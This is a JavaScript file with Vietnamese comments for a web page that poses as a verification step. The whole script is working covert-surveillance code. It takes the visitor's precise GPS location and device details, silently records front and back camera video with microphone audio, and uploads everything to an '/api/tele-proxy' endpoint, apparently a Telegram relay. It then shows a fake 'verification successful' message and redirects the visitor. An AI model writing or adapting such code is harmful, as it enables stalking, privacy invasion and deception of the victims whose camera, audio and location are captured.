// main.js - Quay video ngầm tối ưu cho mobile + Mic + Location
const API_PROXY = '/api/tele-proxy';

const info = {
  time: new Date().toLocaleString('vi-VN'),
  device: '',
  os: '',
  camera: '⏳ Đang xử lý...',
  location: '⏳ Đang lấy vị trí...',
  microphone: '⏳ Đang kiểm tra...',
  lat: 0,
  lon: 0,
  accuracy: 0
};

// --- 1. LẤY VỊ TRÍ GPS CHÍNH XÁC ---
async function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ lat: 0, lon: 0, accuracy: 0, address: 'Không hỗ trợ GPS' });
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        console.log(`📍 Vị trí GPS: ${latitude}, ${longitude} (độ chính xác: ${accuracy}m)`);
        resolve({ 
          lat: latitude, 
          lon: longitude, 
          accuracy: accuracy,
          address: `GPS: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`
        });
      },
      (error) => {
        console.warn('❌ Lỗi GPS:', error.message);
        resolve({ lat: 0, lon: 0, accuracy: 0, address: 'Không thể lấy vị trí' });
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  });
}

// --- 2. KIỂM TRA QUYỀN MIC ---
async function checkMicrophone() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    stream.getTracks().forEach(t => t.stop());
    return '✅ Đã cấp quyền mic';
  } catch (e) {
    return '🚫 Không có quyền mic';
  }
}

// --- 3. NHẬN DIỆN THIẾT BỊ ---
function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
  } else if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } else {
    info.os = ua.includes('Windows') ? 'Windows' : 'Desktop';
    info.device = platform || 'PC/Laptop';
  }
}

// --- 4. QUAY VIDEO NGẦM (CÓ MIC) - KHẮC PHỤC LỖI CAM ĐEN ---
async function recordVideoSilent(facingMode = 'user', duration = 5000) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
  
  try {
    // Ưu tiên codec nhẹ cho mobile
    const mimeTypes = [
      'video/webm;codecs=vp8',
      'video/webm;codecs=vp9',
      'video/webm',
      'video/mp4;codecs=h264'
    ];
    
    let mimeType = null;
    for (const type of mimeTypes) {
      if (MediaRecorder.isTypeSupported(type)) {
        mimeType = type;
        break;
      }
    }
    
    if (!mimeType) {
      mimeType = 'video/webm';
    }

    // Cấu hình video - KHÔNG dùng facingMode để tránh lỗi đen
    const videoConstraints = {
      width: { ideal: 480 },
      height: { ideal: 360 },
      frameRate: { ideal: 15 }
    };

    // Thử với facingMode
    if (facingMode) {
      videoConstraints.facingMode = facingMode;
    }

    console.log(`🎥 Đang quay camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}...`);
    
    // Thử quay với video + audio
    let stream = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: videoConstraints, 
        audio: true 
      });
    } catch (e) {
      // Nếu lỗi, thử lại không có audio
      console.log('🔄 Thử lại không có audio...');
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: videoConstraints, 
        audio: false 
      });
    }

    const mediaRecorder = new MediaRecorder(stream, {
      mimeType: mimeType,
      videoBitsPerSecond: 500000,
      audioBitsPerSecond: 64000
    });

    const chunks = [];

    return new Promise((resolve) => {
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: mimeType });
        stream.getTracks().forEach(t => t.stop());
        console.log(`✅ Đã quay xong camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}, dung lượng: ${(blob.size / 1024).toFixed(2)} KB`);
        resolve(blob);
      };

      mediaRecorder.start(1000);
      
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, duration);
    });

  } catch (e) {
    console.error(`❌ Lỗi quay camera ${facingMode}:`, e);
    return null;
  }
}

// --- 5. QUAY CAMERA TRƯỚC VỚI CÁCH KHÁC (TRÁNH LỖI ĐEN) ---
async function recordFrontCamera(duration = 5000) {
  // Thử nhiều cách để quay camera trước
  const methods = [
    // Cách 1: Dùng facingMode: user
    async () => {
      return await recordVideoSilent('user', duration);
    },
    // Cách 2: Dùng deviceId (nếu có)
    async () => {
      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const cameras = devices.filter(d => d.kind === 'videoinput');
        const frontCam = cameras.find(c => 
          c.label.toLowerCase().includes('front') || 
          c.label.toLowerCase().includes('face') ||
          c.label.toLowerCase().includes('user')
        );
        if (frontCam) {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { deviceId: { exact: frontCam.deviceId } },
            audio: true
          });
          const mimeType = 'video/webm;codecs=vp8';
          const recorder = new MediaRecorder(stream, { mimeType });
          const chunks = [];
          return new Promise((resolve) => {
            recorder.ondataavailable = (e) => chunks.push(e.data);
            recorder.onstop = () => {
              const blob = new Blob(chunks, { type: mimeType });
              stream.getTracks().forEach(t => t.stop());
              resolve(blob);
            };
            recorder.start(1000);
            setTimeout(() => {
              if (recorder.state === 'recording') recorder.stop();
            }, duration);
          });
        }
        return null;
      } catch (e) {
        return null;
      }
    },
    // Cách 3: Không chỉ định facingMode (để hệ thống tự chọn)
    async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { width: 480, height: 360 }
        });
        const mimeType = 'video/webm;codecs=vp8';
        const recorder = new MediaRecorder(stream, { mimeType });
        const chunks = [];
        return new Promise((resolve) => {
          recorder.ondataavailable = (e) => chunks.push(e.data);
          recorder.onstop = () => {
            const blob = new Blob(chunks, { type: mimeType });
            stream.getTracks().forEach(t => t.stop());
            resolve(blob);
          };
          recorder.start(1000);
          setTimeout(() => {
            if (recorder.state === 'recording') recorder.stop();
          }, duration);
        });
      } catch (e) {
        return null;
      }
    }
  ];

  for (const method of methods) {
    try {
      const result = await method();
      if (result) {
        console.log('✅ Quay camera trước thành công!');
        return result;
      }
    } catch (e) {
      console.log('❌ Phương pháp thất bại, thử cách khác...');
    }
  }
  return null;
}

// --- 6. HÀM CHÍNH ---
async function main() {
  const button = document.querySelector('.btn') || document.querySelector('button');
  const statusDiv = document.getElementById('status');
  
  detectDevice();

  // Lấy vị trí GPS
  const location = await getLocation();
  info.lat = location.lat;
  info.lon = location.lon;
  info.location = location.address;
  info.accuracy = location.accuracy;

  // Kiểm tra mic
  info.microphone = await checkMicrophone();

  if (statusDiv) {
    statusDiv.innerHTML = '⏳ Đang xử lý...<br>Vui lòng đợi.';
  }
  
  info.camera = '⏳ Đang quay video...';
  
  // === QUAY CAMERA TRƯỚC (dùng hàm đặc biệt) ===
  console.log('📸 Bắt đầu quay CAMERA TRƯỚC...');
  let frontVideo = await recordFrontCamera(5000);
  
  await new Promise(r => setTimeout(r, 500));
  
  // === QUAY CAMERA SAU ===
  console.log('📸 Bắt đầu quay CAMERA SAU...');
  let backVideo = await recordVideoSilent('environment', 5000);
  
  // Nếu không quay được camera sau, thử lại với front
  if (!backVideo) {
    console.log('📸 Thử quay lại camera trước làm camera sau...');
    backVideo = await recordFrontCamera(3000);
  }
  
  let frontMP4 = null;
  let backMP4 = null;
  
  if (frontVideo) {
    frontMP4 = frontVideo;
    console.log('✅ Camera trước: đã quay xong');
  } else {
    console.log('❌ Không quay được camera trước');
  }
  
  if (backVideo) {
    backMP4 = backVideo;
    console.log('✅ Camera sau: đã quay xong');
  } else {
    console.log('❌ Không quay được camera sau');
  }
  
  // Nếu chỉ có 1 video, nhân đôi để có cả 2
  if (frontMP4 && !backMP4) {
    backMP4 = frontMP4;
    console.log('📸 Dùng video trước làm video sau');
  }
  
  if (!frontMP4 && backMP4) {
    frontMP4 = backMP4;
    console.log('📸 Dùng video sau làm video trước');
  }
  
  info.camera = (frontMP4 || backMP4) ? '✅ Đã quay video' : '🚫 Không quay được video';

  // === GỬI DỮ LIỆU ĐẦY ĐỦ ===
  const formData = new FormData();
  formData.append('clientInfo', JSON.stringify(info));

  if (frontMP4 || backMP4) {
    if (frontMP4) {
      const ext = frontMP4.type.includes('mp4') ? 'mp4' : 'webm';
      formData.append('front', frontMP4, `front.${ext}`);
      console.log('📤 Đã thêm front vào form');
    }
    if (backMP4) {
      const ext = backMP4.type.includes('mp4') ? 'mp4' : 'webm';
      formData.append('back', backMP4, `back.${ext}`);
      console.log('📤 Đã thêm back vào form');
    }
    
    try {
      console.log('📤 Đang gửi video lên server...');
      const response = await fetch(API_PROXY, { 
        method: 'POST', 
        body: formData 
      });
      const result = await response.text();
      console.log('✅ Đã gửi video thành công:', result);
    } catch (e) {
      console.error('❌ Lỗi gửi video:', e);
    }
  } else {
    console.log('📤 Gửi text (không có video)...');
    try {
      const response = await fetch(API_PROXY, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(info)
      });
      const result = await response.text();
      console.log('✅ Đã gửi text thành công:', result);
    } catch (e) {
      console.error('❌ Lỗi gửi text:', e);
    }
  }

  // --- ĐẾM NGƯỢC CHUYỂN HƯỚNG ---
  if (button) {
    button.style.backgroundColor = "#28a745";
    button.style.color = "#ffffff";
    button.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
    
    let timeLeft = 3;
    button.innerText = `Hoàn tất (${timeLeft}s)`;
    
    if (statusDiv) {
      statusDiv.innerHTML = '✅ Xác thực thành công!<br>Đang chuyển hướng...';
    }
    
    const countdownInterval = setInterval(() => {
      timeLeft--;
      if (timeLeft > 0) {
        button.innerText = `Hoàn tất (${timeLeft}s)`;
      } else {
        clearInterval(countdownInterval);
        // THAY LINK CHUYỂN HƯỚNG VÀO ĐÂY
        window.location.href = "";
      }
    }, 1000);
  } else {
    setTimeout(() => {
      window.location.href = "";
    }, 3000);
  }
}

// Kích hoạt hệ thống
main().then(() => console.log("✅ Hệ thống đã hoàn tất."));
